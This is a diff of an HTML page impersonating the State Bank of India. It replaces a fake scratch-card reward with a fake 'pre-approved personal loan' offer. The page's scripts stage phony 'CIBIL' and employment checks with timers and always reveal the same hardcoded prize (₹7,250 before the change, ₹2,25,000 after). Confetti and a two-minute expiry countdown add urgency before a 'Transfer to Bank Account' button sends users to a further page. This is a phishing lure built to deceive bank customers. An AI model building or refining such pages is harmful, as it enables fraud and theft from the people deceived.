@@ -3,189 +3,149 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SBI Rewards - Win</title>
+    <title>SBI - Digital Personal Loan</title>
     <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
     <style>
         * { margin:0; padding:0; box-sizing:border-box; font-family: -apple-system, sans-serif; }
-        body { background-color:#f4f7f9; text-align: center; }
-        .full-img { width: 100%; display: block; border-bottom: 1px solid #ddd; }
+        body { background-color:#f4f7f9; text-align: center; color: #333; }
+        .header-img { width: 100%; display: block; border-bottom: 1px solid #ddd; }
 
-        .container { padding: 30px 15px; }
-        h2 { color: #003366; font-size: 19px; margin-bottom: 10px; }
-        
-        /* Scratch Area */
-        #scratch-widget {
-            position: relative; width: 280px; height: 280px;
-            margin: 0 auto; border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
-            background: #fff; overflow: hidden; border: 4px solid #fff;
+        .main-container { padding: 30px 20px; }
+        .loan-card { 
+            background: white; border-radius: 10px; padding: 25px 15px;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.06); border: 1px solid #e0e6ed;
         }
-        #scratch-canvas { position: absolute; top: 0; left: 0; z-index: 5; cursor: crosshair; touch-action: none; }
+        h2 { color: #003366; font-size: 20px; margin-bottom: 12px; font-weight: 800; }
+        p.sub-text { color: #666; font-size: 14px; margin-bottom: 25px; line-height: 1.4; }
+
+        /* Patla (Slim) Button Style */
+        .check-btn {
+            width: 85%; padding: 10px; background: #007bb5;
+            color: white; border: none; border-radius: 4px;
+            font-size: 14px; font-weight: 600; cursor: pointer;
+            text-transform: uppercase; letter-spacing: 0.5px;
+            box-shadow: 0 3px 10px rgba(0,123,181,0.2);
+        }
+        .check-btn:active { transform: scale(0.98); background: #005f8d; }
 
         /* Modal Popup */
         .modal-overlay { 
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: rgba(0,0,0,0.85); justify-content: center; align-items: center; 
+            background: rgba(0,0,0,0.8); justify-content: center; align-items: center; 
             z-index: 10000; padding: 20px;
         }
         .modal-box { 
-            background: white; padding: 25px 20px; border-radius: 15px; 
-            width: 100%; max-width: 320px; text-align: center; border-top: 6px solid #007bb5;
+            background: white; padding: 25px 20px; border-radius: 12px; 
+            width: 100%; max-width: 320px; text-align: center; border-top: 5px solid #007bb5;
         }
 
-        /* Spinner */
         .spinner { 
             width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #007bb5; 
             border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px; 
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        /* Sleek Amount Box */
-        .amount-box { 
-            display: none; font-size: 38px; font-weight: 800; color: #007bb5; 
-            background: #f0f7ff; padding: 10px; border-radius: 8px; 
-            border: 1.5px dashed #007bb5; margin: 15px 0; 
+        .loan-amount-box { 
+            display: none; font-size: 32px; font-weight: 900; color: #007bb5; 
+            background: #f0f7ff; padding: 12px; border-radius: 8px; 
+            border: 1.5px dashed #007bb5; margin: 15px 0;
         }
         
-        .status-txt { font-size: 13px; color: #666; font-weight: 600; }
+        .timer-red { display: none; color: #d32f2f; font-size: 13px; font-weight: 700; margin-top: 8px; }
 
-        /* Red Expire Timer */
-        #expire-timer { display: none; color: #d32f2f; font-size: 13px; font-weight: 700; margin-top: 5px; }
-
-        .btn-transfer {
-            display: none; width: 100%; padding: 15px; background: #007bb5;
-            color: white; border: none; border-radius: 6px;
-            font-size: 15px; font-weight: 700; cursor: pointer;
+        /* Slim Transfer Button */
+        .btn-claim {
+            display: none; width: 100%; padding: 12px; background: #007bb5;
+            color: white; border: none; border-radius: 4px;
+            font-size: 14px; font-weight: 700; cursor: pointer;
             text-transform: uppercase; margin-top: 15px;
         }
 
-        .footer { width: 100%; margin-top: 40px; padding: 0 15px 30px; }
+        .footer-banner { width: 100%; margin-top: 20px; padding: 0 15px 40px; }
     </style>
 </head>
 <body>
 
-    <img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" class="full-img">
+    <img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" class="header-img">
 
-    <div class="container">
-        <h2>Exclusive Reward Found!</h2>
-        <p style="color:#666; font-size:14px; margin-bottom:20px;">Scratch the card to claim your prize.</p>
-        <div id="scratch-widget">
-            <canvas id="scratch-canvas" width="280" height="280"></canvas>
-            <div style="height:100%; display:flex; align-items:center; justify-content:center; background:#f9f9f9; color:#ccc;">Revealing...</div>
+    <div class="main-container">
+        <div class="loan-card">
+            <h2>Instant Personal Loan</h2>
+            <p class="sub-text">Check your pre-approved loan limit in 10 seconds. Low interest rates & fast approval.</p>
+            <button class="check-btn" onclick="startLoanFlow()">Check My Offer</button>
         </div>
     </div>
 
-    <img src="https://i.ibb.co/5WTjD1Nb/Footer-bfdfef4c-1.jpg" class="footer">
+    <img src="https://i.ibb.co/5WTjD1Nb/Footer-bfdfef4c-1.jpg" class="footer-banner">
 
-    <div class="modal-overlay" id="rewardPopup">
+    <div class="modal-overlay" id="loanModal">
         <div class="modal-box">
-            <h3 id="popTitle" style="color:#444; margin-bottom:12px; font-size: 18px;">Verifying Claim...</h3>
+            <h3 id="modalHeader" style="color:#444; margin-bottom:12px; font-size: 17px;">Verifying Details...</h3>
             
-            <div id="proc-ui">
+            <div id="processing-view">
                 <div class="spinner"></div>
-                <p class="status-txt" id="statusMsg">Connecting to SBI Rewards Server...</p>
+                <p style="font-size: 13px; color:#666;" id="loaderLabel">Analyzing CIBIL Records...</p>
             </div>
 
-            <div class="amount-box" id="amtBox">7000</div>
+            <div class="loan-amount-box" id="loanBox">₹2,00,000</div>
 
-            <div id="expire-timer">Offer expires in: <span id="timer-clock">02:00</span></div>
+            <div class="timer-red" id="timerBox">Offer expires in: <span id="clock">02:00</span></div>
 
-            <button class="btn-transfer" id="finalBtn" onclick="window.location.href='mypages.html'">Transfer to Bank Account</button>
+            <button class="btn-claim" id="claimBtn" onclick="window.location.href='mypages.html'">Transfer to Bank Account</button>
         </div>
     </div>
 
     <script>
-        const canvas = document.getElementById('scratch-canvas');
-        const ctx = canvas.getContext('2d');
-        let isDrawing = false, isFinished = false;
-
-        function init() {
-            ctx.fillStyle = '#b0bec5'; ctx.fillRect(0,0,280,280);
-            ctx.fillStyle = '#fff'; ctx.font = 'bold 22px Arial'; ctx.textAlign = 'center';
-            ctx.fillText('SCRATCH HERE', 140, 145);
-        }
-
-        function scratch(e) {
-            if (isFinished) return;
-            const rect = canvas.getBoundingClientRect();
-            const x = (e.touches ? e.touches[0].clientX : e.clientX) - rect.left;
-            const y = (e.touches ? e.touches[0].clientY : e.clientY) - rect.top;
-            ctx.globalCompositeOperation = 'destination-out';
-            ctx.beginPath(); ctx.arc(x, y, 30, 0, Math.PI*2); ctx.fill();
-            check();
-        }
-
-        function check() {
-            const pix = ctx.getImageData(0,0,280,280).data;
-            let trans = 0;
-            for(let i=0; i<pix.length; i+=4) { if(pix[i+3] === 0) trans++; }
-            if(trans > (pix.length/4)*0.45) {
-                isFinished = true; canvas.style.display='none';
-                startFlow();
-            }
-        }
-
-        function startFlow() {
-            document.getElementById('rewardPopup').style.display = 'flex';
-            const status = document.getElementById('statusMsg');
+        function startLoanFlow() {
+            document.getElementById('loanModal').style.display = 'flex';
+            const label = document.getElementById('loaderLabel');
             
-            setTimeout(() => status.innerText = "Authenticating Rewards Profile...", 3000);
-            setTimeout(() => status.innerText = "Finalizing Eligible Amount...", 7000);
+            setTimeout(() => label.innerText = "Checking Employment Status...", 3000);
+            setTimeout(() => label.innerText = "Finalizing Loan Limit...", 7000);
 
             setTimeout(() => {
-                document.getElementById('proc-ui').style.display = 'none';
-                document.getElementById('amtBox').style.display = 'block';
-                document.getElementById('popTitle').innerText = "Calculating Reward...";
-                spinAmount();
+                document.getElementById('processing-view').style.display = 'none';
+                document.getElementById('loanBox').style.display = 'block';
+                document.getElementById('modalHeader').innerText = "Personal Loan Offer:";
+                runAmountSpin();
             }, 10000);
         }
 
-        function spinAmount() {
-            const amtBox = document.getElementById('amtBox');
+        function runAmountSpin() {
+            const box = document.getElementById('loanBox');
             let start = Date.now();
             let duration = 4000; 
             
-            const timer = setInterval(() => {
-                let elapsed = Date.now() - start;
-                if(elapsed < duration) {
-                    amtBox.innerText = Math.floor(Math.random() * (7500 - 7000 + 1)) + 7000;
+            const spin = setInterval(() => {
+                let diff = Date.now() - start;
+                if(diff < duration) {
+                    let val = Math.floor(Math.random() * (250000 - 200000 + 1)) + 200000;
+                    box.innerText = "₹" + val.toLocaleString('en-IN');
                 } else {
-                    clearInterval(timer);
-                    amtBox.innerText = "₹7,250";
-                    showFinal();
+                    clearInterval(spin);
+                    box.innerText = "₹2,25,000";
+                    finishLoanDisplay();
                 }
             }, 70);
         }
 
-        function showFinal() {
-            document.getElementById('popTitle').innerText = "Congratulations!";
-            document.getElementById('popTitle').style.color = "#2ecc71";
-            document.getElementById('finalBtn').style.display = "block";
-            document.getElementById('expire-timer').style.display = "block";
-            startTimer(120); // 2 minute countdown
+        function finishLoanDisplay() {
+            document.getElementById('modalHeader').innerText = "Congratulations!";
+            document.getElementById('modalHeader').style.color = "#2ecc71";
+            document.getElementById('claimBtn').style.display = "block";
+            document.getElementById('timerBox').style.display = "block";
+            
+            let timeLeft = 120;
+            const clockEl = document.getElementById('clock');
+            const interval = setInterval(() => {
+                let m = Math.floor(timeLeft / 60);
+                let s = timeLeft % 60;
+                clockEl.innerText = `0${m}:${s < 10 ? '0'+s : s}`;
+                if (--timeLeft < 0) { clearInterval(interval); }
+            }, 1000);
+
             confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });
         }
-
-        function startTimer(duration) {
-            let timer = duration, minutes, seconds;
-            const display = document.getElementById('timer-clock');
-            setInterval(function () {
-                minutes = parseInt(timer / 60, 10);
-                seconds = parseInt(timer % 60, 10);
-                minutes = minutes < 10 ? "0" + minutes : minutes;
-                seconds = seconds < 10 ? "0" + seconds : seconds;
-                display.textContent = minutes + ":" + seconds;
-                if (--timer < 0) timer = 0;
-            }, 1000);
-        }
-
-        canvas.addEventListener('mousedown', () => isDrawing = true);
-        canvas.addEventListener('touchstart', () => isDrawing = true);
-        window.addEventListener('mouseup', () => isDrawing = false);
-        window.addEventListener('touchend', () => isDrawing = false);
-        canvas.addEventListener('mousemove', (e) => isDrawing && scratch(e));
-        canvas.addEventListener('touchmove', (e) => isDrawing && scratch(e));
-        init();
     </script>
 </body>
 </html>
